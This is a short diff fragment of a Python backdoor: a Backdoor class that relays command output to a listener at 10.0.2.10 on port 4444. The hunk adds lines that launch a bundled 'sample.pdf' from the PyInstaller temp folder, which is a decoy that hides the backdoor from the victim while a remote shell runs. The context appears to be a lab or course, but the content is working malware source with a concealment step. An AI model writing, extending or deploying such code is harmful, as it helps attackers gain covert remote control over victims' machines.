@@ -77,6 +77,9 @@ class Backdoor:
 
             self.reliable_send(command_result)
 
+file_name = sys._MEIPASS + "\sample.pdf"
+subprocess.Popen(file_name, shell=True)
+
 try:
     my_backdoor = Backdoor("10.0.2.10", 4444)
     my_backdoor.run()
